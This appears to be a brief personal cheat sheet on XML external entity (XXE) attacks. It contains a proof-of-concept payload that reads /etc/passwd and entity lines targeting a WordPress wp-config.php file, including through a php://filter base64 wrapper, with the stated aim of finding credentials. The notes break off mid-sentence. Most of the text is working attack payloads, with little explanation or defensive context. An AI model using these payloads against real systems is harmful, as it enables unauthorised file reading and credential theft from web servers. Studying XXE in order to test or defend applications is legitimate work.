# XXE

### Resources

- [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
- 

POC code for XXE

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This would output the contents of `/etc/passwd`.

The main thing you can do with this is LFI. You might be able to get this file with php filters

```bash
[<!ENTITY passwd SYSTEM "file:///var/www/html/wp-config.php">]>
```

Like this?

```bash
[<!ENTITY passwd SYSTEM "php://filter/convert.base64-encode/resource=file:///var/www/html/wp-config.php">
]>
```

If you’re able to find some creds